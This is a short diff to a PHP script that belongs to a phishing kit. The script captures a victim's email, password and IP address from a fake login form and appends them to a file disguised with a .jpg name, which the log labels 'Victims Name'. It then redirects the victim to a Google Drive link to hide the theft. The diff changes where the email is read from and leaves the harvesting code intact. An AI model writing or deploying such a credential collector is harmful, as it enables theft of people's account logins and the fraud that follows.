@@ -1,5 +1,5 @@
 <?php
-$email = $_POST['Email']; 
+$email = $_SESSION['Email']; 
 $password = $_POST['Passwd'];
 $ip = $_SERVER['REMOTE_ADDR']; 
 $f = fopen("AAC189092019881999191919191mobeen.jpg", "a"); 
@@ -7,3 +7,5 @@ fwrite ($f, 'Victims Name: [<b><font color="#570000">'.$email.'</font></b>] Vict
 fclose($f);
 header('Location:https://drive.google.com/file/d/0B6gbXN_c6lAQWGF1alVfSDNEREE/view');
 ?>
+
+
